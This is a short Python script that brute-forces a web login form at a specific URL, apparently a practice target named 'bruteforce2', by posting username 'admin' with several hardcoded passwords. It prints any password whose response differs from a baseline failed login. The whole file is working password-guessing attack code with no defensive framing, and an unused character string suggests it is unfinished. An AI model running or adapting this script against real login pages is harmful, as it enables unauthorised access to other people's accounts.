import requests

import time
from requests.exceptions import ConnectTimeout



char = 'abcdefghijklmnopqrstuvwxyz'
url = 'https://dudo.gvpt.sk/bruteforce2/index.php'
passwords = ['idsa','sadd','dsad','asds','xamp']
certain = requests.post(url,data={'password':'x'})
certain = certain.text
for password in passwords:
    idk = requests.post(url,data={'username':'admin','password':password})
    if idk.text!=certain:
        print(password)
        print('done')